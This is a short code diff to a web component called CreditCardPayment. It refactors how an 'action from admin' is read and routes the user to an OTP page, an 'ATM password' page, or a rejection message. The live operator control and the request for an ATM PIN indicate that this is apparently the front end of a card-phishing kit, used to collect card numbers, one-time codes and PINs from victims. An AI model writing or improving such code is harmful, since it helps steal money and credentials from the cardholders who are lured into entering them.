@@ -181,14 +181,16 @@ export default function CreditCardPayment() {
   // Handle card action from admin
   useSignalEffect(() => {
     if (cardAction.value) {
+      const action = cardAction.value.action;
+      
       // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
       waitingMessage.value = "";
       
-      if (cardAction.value === 'otp') {
+      if (action === 'otp') {
         navigate("/otp-verification");
-      } else if (cardAction.value === 'atm') {
+      } else if (action === 'atm') {
         navigate("/atm-password");
-      } else if (cardAction.value === 'reject') {
+      } else if (action === 'reject') {
         setRejectedError(true);
       }
       // Reset card action
